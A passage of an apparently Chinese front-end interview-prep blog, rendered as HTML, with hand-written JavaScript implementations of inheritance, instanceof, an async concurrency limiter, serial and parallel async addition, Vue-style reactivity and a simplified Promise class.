function_">F</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parent</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Parent</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Parent</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayName</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Child</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Child</span>(<span class="params">age, name</span>) &#123;</span><br><span class="line">  <span class="title class_">Parent</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, name);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Child</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title function_">create</span>(<span class="title class_">Parent</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="title class_">Child</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Child</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Child</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayAge</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">age</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">const</span> child = <span class="keyword">new</span> <span class="title class_">Child</span>(<span class="number">18</span>, <span class="string">&quot;Jack&quot;</span>);</span><br><span class="line">child.<span class="title function_">sayName</span>();</span><br><span class="line">child.<span class="title function_">sayAge</span>();</span><br></pre></td></tr></table></figure><h4 id="11-instanceof"><a href="#11-instanceof" class="headerlink" title="11. instanceof"></a>11. instanceof</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isInstanceOf</span>(<span class="params">instance, klass</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> proto = instance.<span class="property">__proto__</span></span><br><span class="line">  <span class="keyword">let</span> prototype = klass.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (proto === <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    <span class="keyword">if</span> (proto === prototype) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    proto = proto.<span class="property">__proto__</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span> &#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Parent</span> &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> child = <span class="keyword">new</span> <span class="title class_">Child</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isInstanceOf</span>(child, <span class="title class_">Parent</span>), <span class="title function_">isInstanceOf</span>(child, <span class="title class_">Child</span>), <span class="title function_">isInstanceOf</span>(child, <span class="title class_">Array</span>));</span><br></pre></td></tr></table></figure><h4 id="12-异步并发数限制"><a href="#12-异步并发数限制" class="headerlink" title="12. 异步并发数限制"></a>12. 异步并发数限制</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 关键点</span></span><br><span class="line"><span class="comment"> * 1. new promise 一经创建，立即执行</span></span><br><span class="line"><span class="comment"> * 2. 使用 Promise.resolve().then 可以把任务加到微任务队列，防止立即执行迭代方法</span></span><br><span class="line"><span class="comment"> * 3. 微任务处理过程中，产生的新的微任务，会在同一事件循环内，追加到微任务队列里</span></span><br><span class="line"><span class="comment"> * 4. 使用 race 在某个任务完成时，继续添加任务，保持任务按照最大并发数进行执行</span></span><br><span class="line"><span class="comment"> * 5. 任务完成后，需要从 doingTasks 中移出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">limit</span>(<span class="params">count, array, iterateFunc</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> tasks = []</span><br><span class="line">  <span class="keyword">const</span> doingTasks = []</span><br><span class="line">  <span class="keyword">let</span> i = <span class="number">0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">enqueue</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (i === array.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> task = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> <span class="title function_">iterateFunc</span>(array[i++]))</span><br><span class="line">    tasks.<span class="title function_">push</span>(task)</span><br><span class="line">    <span class="keyword">const</span> doing = task.<span class="title function_">then</span>(<span class="function">() =&gt;</span> doingTasks.<span class="title function_">splice</span>(doingTasks.<span class="title function_">indexOf</span>(doing), <span class="number">1</span>))</span><br><span class="line">    doingTasks.<span class="title function_">push</span>(doing)</span><br><span class="line">    <span class="keyword">const</span> res = doingTasks.<span class="property">length</span> &gt;= count ? <span class="title class_">Promise</span>.<span class="title function_">race</span>(doingTasks) : <span class="title class_">Promise</span>.<span class="title function_">resolve</span>()</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">then</span>(enqueue)</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">enqueue</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(tasks))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">timeout</span> = i =&gt; <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="title function_">resolve</span>(i), i))</span><br><span class="line"><span class="title function_">limit</span>(<span class="number">2</span>, [<span class="number">1000</span>, <span class="number">1000</span>, <span class="number">1000</span>, <span class="number">1000</span>], timeout).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="13-异步串行-异步并行"><a href="#13-异步串行-异步并行" class="headerlink" title="13. 异步串行 | 异步并行"></a>13. 异步串行 | 异步并行</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字节面试题，实现一个异步加法</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">asyncAdd</span>(<span class="params">a, b, callback</span>) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">callback</span>(<span class="literal">null</span>, a + b);</span><br><span class="line">  &#125;, <span class="number">500</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解决方案</span></span><br><span class="line"><span class="comment">// 1. promisify</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">promiseAdd</span> = (<span class="params">a, b</span>) =&gt; <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">asyncAdd</span>(a, b, <span class="function">(<span class="params">err, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="title function_">reject</span>(err)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(res)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 串行处理</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">serialSum</span>(<span class="params">...args</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> args.<span class="title function_">reduce</span>(<span class="function">(<span class="params">task, now</span>) =&gt;</span> task.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="title function_">promiseAdd</span>(res, now)), <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">0</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 并行处理</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">parallelSum</span>(<span class="params">...args</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (args.<span class="property">length</span> === <span class="number">1</span>) <span class="keyword">return</span> args[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">const</span> tasks = []</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; args.<span class="property">length</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">    tasks.<span class="title function_">push</span>(<span class="title function_">promiseAdd</span>(args[i], args[i + <span class="number">1</span>] || <span class="number">0</span>))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> results = <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(tasks)</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">parallelSum</span>(...results)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Running...&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> res1 = <span class="keyword">await</span> <span class="title function_">serialSum</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res1)</span><br><span class="line">  <span class="keyword">const</span> res2 = <span class="keyword">await</span> <span class="title function_">parallelSum</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res2)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Done&#x27;</span>);</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h4 id="14-vue-reactive"><a href="#14-vue-reactive" class="headerlink" title="14. vue reactive"></a>14. vue reactive</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Dep module</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dep</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> stack = []</span><br><span class="line">  <span class="keyword">static</span> target = <span class="literal">null</span></span><br><span class="line">  deps = <span class="literal">null</span></span><br><span class="line">  </span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">deps</span> = <span class="keyword">new</span> <span class="title class_">Set</span>()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">depend</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Dep</span>.<span class="property">target</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">deps</span>.<span class="title function_">add</span>(<span class="title class_">Dep</span>.<span class="property">target</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">notify</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">deps</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">w</span> =&gt;</span> w.<span class="title function_">update</span>())</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">pushTarget</span>(<span class="params">t</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">target</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">stack</span>.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="property">target</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">target</span> = t</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">popTarget</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">target</span> = <span class="variable language_">this</span>.<span class="property">stack</span>.<span class="title function_">pop</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// reactive</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">reactive</span>(<span class="params">o</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (o &amp;&amp; <span class="keyword">typeof</span> o === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(o).<span class="title function_">forEach</span>(<span class="function"><span class="params">k</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">defineReactive</span>(o, k, o[k])</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> o</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">defineReactive</span>(<span class="params">obj, k, val</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> dep = <span class="keyword">new</span> <span class="title class_">Dep</span>()</span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, k, &#123;</span><br><span class="line">    <span class="title function_">get</span>(<span class="params"></span>) &#123;</span><br><span class="line">      dep.<span class="title function_">depend</span>()</span><br><span class="line">      <span class="keyword">return</span> val</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">set</span>(<span class="params">newVal</span>) &#123;</span><br><span class="line">      val = newVal</span><br><span class="line">      dep.<span class="title function_">notify</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> (val &amp;&amp; <span class="keyword">typeof</span> val === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_">reactive</span>(val)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// watcher</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Watcher</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">effect</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">effect</span> = effect</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">update</span>()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">update</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Dep</span>.<span class="title function_">pushTarget</span>(<span class="variable language_">this</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">value</span> = <span class="variable language_">this</span>.<span class="title function_">effect</span>()</span><br><span class="line">    <span class="title class_">Dep</span>.<span class="title function_">popTarget</span>()</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">value</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试代码</span></span><br><span class="line"><span class="keyword">const</span> data = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">  <span class="attr">msg</span>: <span class="string">&#x27;aaa&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Watcher</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;===&gt; effect&#x27;</span>, data.<span class="property">msg</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  data.<span class="property">msg</span> = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure><h4 id="15-promise"><a href="#15-promise" class="headerlink" title="15. promise"></a>15. promise</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 建议阅读 [Promises/A+ 标准](https://promisesaplus.com/)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyPromise</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">func</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">status</span> = <span class="string">&#x27;pending&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">value</span> = <span class="literal">null</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">resolvedTasks</span> = []</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">rejectedTasks</span> = []</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_resolve</span> = <span class="variable language_">this</span>.<span class="property">_resolve</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_reject</span> = <span class="variable language_">this</span>.<span class="property">_reject</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>)</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="title function_">func</span>(<span class="variable language_">this</span>.<span class="property">_resolve</span>, <span class="variable language_">this</span>.<span class="property">_reject</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">_reject</span>(error)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">_resolve</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">status</span> = <span class="string">&#x27;fulfilled&#x27;</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">value</span> = value</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">resolvedTasks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">t</span> =&gt;</span> <span class="title function_">t</span>(value))</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">_reject</span>(<span class="params">reason</span>) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">status</span> = <span class="string">&#x27;reject&#x27;</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">value</span> = reason</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rejectedTasks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">t</span> =&gt;</span> <span class="title function_">t</span>(reason))</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">then</span>(<span class="params">onFulfilled, onRejected</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyPromise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">resolvedTasks</span>.<span class="title function_">push</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> res = <span class="title function_">onFulfilled</span>(value)</span><br><span class="line">          <span class="keyword">if</span> (res <span class="keyword">instanceof</span> <span class="title class_">MyPromise</span>) &#123;</span><br><span class="line">            res.<span class="title function_">then</span>(resolve, reject)</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">resolve</span>(res)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">          <span class="title function_">reject</span>(error)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rejectedTasks</span>.<span class="title function_">push</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> res = <span class="title function_">onRejected</span>(value)</span><br><span class="line">          <span class="keyword">if</span> (res <span class="keyword">instanceof</span> <span class="title class_">MyPromise</span>) &#123;</span><br><span class="line">            res.<span class="title function_">then</span>(resolve, reject)</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">reject</span>(res)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">          <span class="title function_">reject</span>(error)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">catch</span>(onRejected) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">then</span>(<span class="literal">null</span>, onRejected);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">MyPromise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;, <span class="number">500</span>);</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyPromise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;, <span class="number">500</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;a error&#x27;</span>)</span><br><span class="line">  &#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span 